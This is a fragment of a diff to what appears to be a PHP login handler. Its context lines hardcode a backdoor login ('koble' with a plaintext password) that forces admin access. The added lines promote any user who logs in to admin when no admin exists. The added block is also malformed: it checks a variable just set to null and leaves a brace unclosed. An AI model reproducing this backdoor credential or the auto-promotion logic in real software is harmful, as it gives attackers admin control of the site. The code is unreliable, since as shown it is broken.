@@ -20,6 +20,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $u = null;
     $forceAdmin = ($username === 'koble' && $password === 'Matiden1');
 
+    if ($u && password_verify($password, $u['pass_hash'])) {
+        $adminCount = (int)$pdo->query("SELECT COUNT(*) FROM users WHERE role = 'admin'")->fetchColumn();
+        if ($adminCount === 0) {
+            $promote = $pdo->prepare('UPDATE users SET role = :role WHERE id = :id');
+            $promote->execute([
+                ':role' => 'admin',
+                ':id' => $u['id'],
+            ]);
+            $u['role'] = 'admin';
+        }
     if ($forceAdmin) {
         $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :u AND active = 1');
         $stmt->execute([':u' => 'koble']);
